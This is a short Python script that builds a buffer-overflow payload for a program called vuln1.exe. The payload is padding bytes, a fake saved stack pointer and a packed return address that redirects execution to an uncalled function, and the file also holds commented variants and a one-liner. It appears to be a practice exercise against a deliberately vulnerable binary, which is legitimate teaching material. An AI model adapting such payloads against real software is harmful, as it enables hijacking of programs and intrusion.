#!/usr/bin/python

import os
import struct

##This payload is for vuln1.exe 
payload = "A"*0x6b
payload += "BBBB"	#old sp
#return to not_called function
#payload +=\x64\x01\x01
#payload+=struct.pack("I",0x0002dd24)
payload+=struct.pack("I",0x0002dd24)
print "\"%s\""%payload
#(python -c 'print "A"*0x6c + "BBBB" + "\x1c\xdd\x02"
